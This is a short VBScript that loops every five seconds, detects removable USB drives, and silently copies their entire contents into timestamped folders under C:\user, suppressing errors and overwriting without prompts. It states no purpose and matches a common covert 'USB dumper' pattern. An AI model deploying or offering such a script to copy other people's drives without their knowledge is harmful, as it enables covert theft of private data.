Option Explicit

Dim fso, wmi, usb, drive, destination, objFolder, objFile
Set fso = CreateObject("Scripting.FileSystemObject")
Set wmi = GetObject("winmgmts:\\.\root\cimv2")

' Main folder where USB data will be copied
destination = "C:\user"
If Not fso.FolderExists(destination) Then
    fso.CreateFolder(destination)
End If

Do
    Set usb = wmi.ExecQuery("Select * From Win32_LogicalDisk Where DriveType = 2")
    For Each drive In usb
        On Error Resume Next
        If fso.DriveExists(drive.DeviceID) Then
            Dim usbName, usbFolder
            usbName = GetUSBName(drive.DeviceID) ' Get USB name
            usbFolder = destination & "\" & usbName & "_" & GetTimestamp()
            
            If Not fso.FolderExists(usbFolder) Then
                fso.CreateFolder(usbFolder)
            End If
            
            CopyDrive drive.DeviceID, usbFolder
        End If
        On Error GoTo 0
    Next
    WScript.Sleep 5000 ' Check every 5 seconds
Loop

' Function to copy files and folders from USB
Sub CopyDrive(sourceDrive, destinationFolder)
    If Not fso.FolderExists(destinationFolder) Then
        fso.CreateFolder(destinationFolder)
    End If
    
    Set objFolder = fso.GetFolder(sourceDrive)
    For Each objFile In objFolder.Files
        On Error Resume Next
        fso.CopyFile objFile.Path, destinationFolder & "\", True ' Overwrite files without prompting
        On Error GoTo 0
    Next
    
    For Each objFolder In objFolder.SubFolders
        On Error Resume Next
        fso.CopyFolder objFolder.Path, destinationFolder & "\" & objFolder.Name, True ' Overwrite folders without prompting
        On Error GoTo 0
    Next
End Sub

' Function to get USB Name
Function GetUSBName(driveLetter)
    Dim drv
    Set drv = fso.GetDrive(driveLetter)
    GetUSBName = drv.VolumeName
End Function

' Function to get timestamp for unique folder name
Function GetTimestamp()
    Dim dateTime
    dateTime = Now
    GetTimestamp = Year(dateTime) & "-" & Right("0" & Month(dateTime), 2) & "-" & Right("0" & Day(dateTime), 2) & "_" & Right("0" & Hour(dateTime), 2) & "-" & Right("0" & Minute(dateTime), 2)
End Function
